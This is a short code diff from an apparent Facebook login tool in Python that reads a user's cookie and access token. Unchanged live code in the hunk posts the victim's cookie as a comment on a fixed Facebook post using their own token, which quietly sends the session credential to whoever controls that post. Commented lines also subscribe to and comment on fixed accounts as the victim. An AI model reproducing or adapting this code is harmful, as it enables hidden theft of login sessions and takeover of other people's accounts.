@@ -926,7 +926,6 @@ def logincoki():
 					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
 					open('.fantoken.txt','w').write(token)
 					Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
-					generate_token_eaag(cok)
 					#requests.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={token}')
 					#requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cok})
 					requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={cok}&access_token={token}", headers={"cookie": cok})
